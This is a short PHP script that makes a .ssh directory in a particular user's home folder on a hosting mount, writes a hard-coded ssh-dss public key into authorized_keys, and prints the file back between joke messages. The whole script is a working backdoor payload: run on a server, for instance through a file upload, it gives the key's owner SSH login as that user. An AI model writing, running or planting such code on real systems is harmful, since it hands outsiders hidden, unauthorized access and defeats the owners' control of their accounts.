<?php

    ini_set('display_errors', 'On');
    error_reporting(E_ALL ^ E_NOTICE);
    echo "lol: \n";

    mkdir('/mount/home/user-jhyumzrkaw/.ssh/');
    $handle = fopen('/mount/home/user-jhyumzrkaw/.ssh/authorized_keys', 'c');
    fwrite($handle, "ssh-dss AAAAB3NzaC1kc3MAAACBAJaxs3RGSEWqwgxNVkikbGr9F8HolT6JVQdAJ/xUzcKOHFM/dOitIIdvCT8kzz9i0tuVlUmXtmWwZLSqbe8AtC1grK7BQTnjUVKTWibqcI6rWcVPcTg8xflTrzyr7u9i5a+pjJYLO3XrqNeChfApBP5U57nbbBfdE3n66w4lPL7PAAAAFQCkHNFON2oioctdDkAil7EguJp/IQAAAIBvAJDXPuETJRNHYimStj+gBJnvC9we/7ti8ZlQCt8jN9N5Vp/4qLGIYRiD11JKy4x2+SD5oPySBcMP6GgMh69aDmvK2523h6Eea20IXibpNWVWFmE16AAuDhWGhWx/ivbaPUWL0ay0PkekVdlBCbIZ1TEPPGS5mfRVUNFE3KWDzAAAAIEAkm0QC7v25XplloUqEog+dofA3tsDUZIhXnb1UXx4hD16Mf5rvKliPfpjn7aZQJVTYb9jtvhDcSO/ItJAgp1EIh7E4mxOtlxee1HjZiaJAMr1qsbWlufEGJwjw4jYcFtM8PDCdc9+Zz7J6WxamjYj6sWt9U/uOcKPVQ1mLFKCQok= pope@beemo.local");
    echo file_get_contents('/mount/home/user-jhyumzrkaw/.ssh/authorized_keys');

    echo "lmao";

?>